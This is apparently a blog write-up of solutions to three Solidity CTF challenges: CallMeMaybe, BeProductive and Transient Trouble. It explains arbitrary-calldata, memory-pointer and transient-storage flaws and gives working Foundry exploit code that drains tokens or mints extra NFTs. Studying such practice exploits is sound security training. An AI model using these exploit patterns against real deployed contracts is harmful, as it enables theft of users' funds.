+++
title = "SmartSecRiddles CTF Solutions"
description = "This is a series CTF challenges based in real-world common vulnerabilities featuring interesting concepts like **malicious calldata**, **memory references** and **transient storage**"
date = "2025-02-13"

[taxonomies]
tags = ["coding",  "achievement", "ctf", "challenge", "solidity", "foundry"]

[extra]
achievement_category = "Web3 Achievements"
category = "Challenges"
features_section_name = "Solutions"
home_feed_label = "Challenge/CTF"
+++

## Overview
This CTF challenge series is designed around real-world vulnerabilities, showcasing key concepts such as **malicious calldata**, **memory pointers/references** in Solidity, and **transient storage**. My solutions are available on [GitHub](https://github.com/vesla0x1/SmartSecRiddles).

## CallMeMaybe 
This smart contract enables users to pool their tokens and call other contracts with a larger sum. You start with 1 token (1e18), while the contract holds 300 tokens. The objective is to steal both the contract's 300 tokens and any tokens from users who have approved it to spend their balance. The solution exploits the `usePooledWealth` function to force token transfers from users to the contract and grant approval for our address to spend its entire balance, allowing us to withdraw the tokens.

My solution is available on GitHub: [CallMeMaybe Solution](https://github.com/vesla0x1/SmartSecRiddles/commit/522bb40386c7b5aba9eb6770572f8b8cf69468b5).


```javascript
    // group mebers can flashloan tokens
    function usePooledWealth(bytes memory _calldata, address _target) external {
        require(depositers[msg.sender], "Don't be shy, join the group first");
        uint256 startBalance = IERC20(token).balanceOf(address(this));

        // make call here
@>      _target.call(_calldata);

        require(IERC20(token).balanceOf(address(this)) >= startBalance, "Isn't the point of crypto to trust each other, smh");
    }
```

Since the `usePooledWealth` function does not validate the `_target` and `_calldata` parameters, we can exploit this by passing the token contract address as `_target`. When the contract executes the `_target.call`, it will process any calldata provided by the user. 

Given that users have already approved the `CallMeMaybe` contract to spend their tokens, we can force the transfer of their tokens to the contract by crafting calldata such as: 

```javascript
transferFrom(userAddr, callMeMaybeAddr, token.balanceOf(user))
```

This will transfer the user's entire token balance to the `CallMeMaybe` contract. Once the contract holds all the approved tokens, we can further exploit it by making the contract approve our address to spend its entire balance. We achieve this by calling the `usePooledWealth` function again, passing the token address as `_target` and the following calldata:

```javascript
approve(address(attacker), type(uint256).max)
```

This sets the allowance for our address to the maximum possible value (`type(uint256).max`). Once the contract has approved our address to spend its entire balance, we can transfer all the tokens to ourselves by calling:

```javascript
token.transferFrom(callMeMaybeAddr, attackerAddr, token.balanceOf(callMeMaybeAddr))
```

This effectively drains all the tokens held by the `CallMeMaybe` contract.

---

## BeProductive

The **BeProductive** smart contract helps users save money by allowing them to set goals and lock up tokens. Upon reaching their goal, they can call `completeGoal()` to receive their saved amount plus an additional 100 tokens as a reward. To encourage planning, the contract also has a `plan()` function that rewards users with 0.1 tokens for calculating how far they are from their goal.

My solution is available on Github: [BeProductive Solution](https://github.com/vesla0x1/SmartSecRiddles/blob/solutions/test/4_BeProductive.t.sol)

### Vulnerability Analysis

The vulnerability in **BeProductive** lies in its improper handling of memory pointers. Specifically, the issue is in how the contract uses memory variables within the `plan()` function. Here's the critical snippet:

```javascript
currTracker.saved += 0.1 ether;
envisionedTracker.saved += _amount;
goalTracker[msg.sender] = currTracker;
```

The key problem is that `envisionedTracker` is set as a pointer to `currTracker`. When `envisionedTracker` is updated, it unintentionally updates `currTracker` as well, causing `currTracker.saved` to be set to `_amount`. This allows an attacker to manipulate their saved amount by passing a value for `_amount` that includes the contract's balance of tokens, effectively giving them access to all funds.

### Exploit Strategy

1. **Create an Arbitrary Goal**: Start by creating a savings goal of 50 ether + 1, which is the minimum required to call `createGoal` and approving the target contract to spend our entire balance.

2. **Manipulate with `plan()`**: Call `plan()` with the amount equal to the goal's starting amount minus the contract's entire token balance. This leverages the memory pointer vulnerability to set the saved amount to the total balance.

3. **Complete the Goal**: Finally, call `completeGoal()` to receive all saved tokens, including those manipulated in the previous step.

### Exploit Code

```javascript
function test_GetThisPassing_4() public {
    address hacker = address(0xBAD);
    address targetAddr = address(target);
    uint256 initialBalance = token.balanceOf(hacker);
    
    vm.startPrank(hacker);
    
    token.approve(targetAddr, initialBalance);
    target.createGoal(initialBalance, 50 ether + 1);
    target.plan(token.balanceOf(targetAddr) - initialBalance);
    target.completeGoal();

    vm.stopPrank();

    assertGt(token.balanceOf(hacker), 700 ether);
}
```

### Lessons Learned

This challenge demonstrates the importance of understanding how memory pointers work in Solidity. Memory variables that act as pointers can introduce unintended behavior when reassigned, leading to critical security flaws. Auditing code for pointer assignments and state changes is crucial to ensuring smart contract security.

### Solution on GitHub

You can find my full solution for **BeProductive** on [GitHub](https://github.com/vesla0x1/SmartSecRiddles/blob/solutions/test/4_BeProductive.t.sol).

---

## Transient Trouble

**Transient Trouble** revolves around the `ExclusiveClub` smart contract, which allows users to join an exclusive club by paying a fee and receiving an NFT as a membership ticket. The contract uses **transient storage** to verify that a user has paid the admission fee before minting the ticket. If you're unfamiliar with transient storage or want a deeper dive into its implications and best practices, check out my detailed blog post: [Transient Storage in Ethereum: A Comprehensive Guide](/articles/transient-storage/).

My solution is available on Github: [TransientTrouble Solution](https://github.com/vesla0x1/SmartSecRiddles/blob/solutions/test/8_TransientTrouble.t.sol)

### Vulnerability Analysis

The vulnerability arises from improper handling of **transient storage**. Unlike regular storage, transient storage is cleared only at the end of a transaction, not at the end of each function call. This design flaw allows an attacker to call `payAdmission()` once and then repeatedly call `receiveTicket()` within the same transaction, minting multiple tickets for a single payment.


### Exploit Strategy

The strategy involves:
1. **Setting Transient Storage**: Call `payAdmission()` to set the transient storage flag.
2. **Exploiting Transient Storage**: Call `receiveTicket()` multiple times within the same transaction, allowing the minting of multiple NFTs.
3. **Collecting the NFTs**: Transfer the minted NFTs to the attacker's address.

### Exploit Code
To exploit this, we deploy an attacker contract to group all the necessary steps within a single transaction:

```javascript
contract Exploit {
    ExclusiveClub daClub;
    NFT ticket;

    constructor(ExclusiveClub _daClub, NFT _ticket) payable {
        daClub = _daClub;
        ticket = _ticket;
    }

    function exploit() external {
        daClub.externalJoinClub{value: 0.1 ether}();
        daClub.receiveTicket();
        daClub.receiveTicket();

        ticket.transferFrom(address(this), address(0xBAD), 0);
        ticket.transferFrom(address(this), address(0xBAD), 1);
        ticket.transferFrom(address(this), address(0xBAD), 2);
    }
}
```

And the corresponding test function:
```javascript
function test_GetThisPassing_8() public {
    address hacker = address(0xBAD);

    vm.startPrank(hacker);
    Exploit e = new Exploit{value: 0.1 ether}(daClub, ticket);
    e.exploit();
    
    vm.stopPrank();

    assertGt(ticket.balanceOf(hacker), 2);
}
```

### Lessons Learned
This exploit showcases the risks of using transient storage without explicitly clearing it after critical operations. It also demonstrates how composability issues can arise when contracts are called multiple times within the same transaction. Developers must be cautious when using transient storage, especially for reentrancy guards and state validation.

If you're interested in learning more about transient storage and its implications on smart contract security, read my blog post: [Transient Storage in Ethereum: A Comprehensive Guide](/articles/transient-storage/).

### Solution on GitHub

You can find my full solution for **Transient Trouble** on [GitHub](https://github.com/vesla0x1/SmartSecRiddles/blob/solutions/test/8_TransientTrouble.t.sol).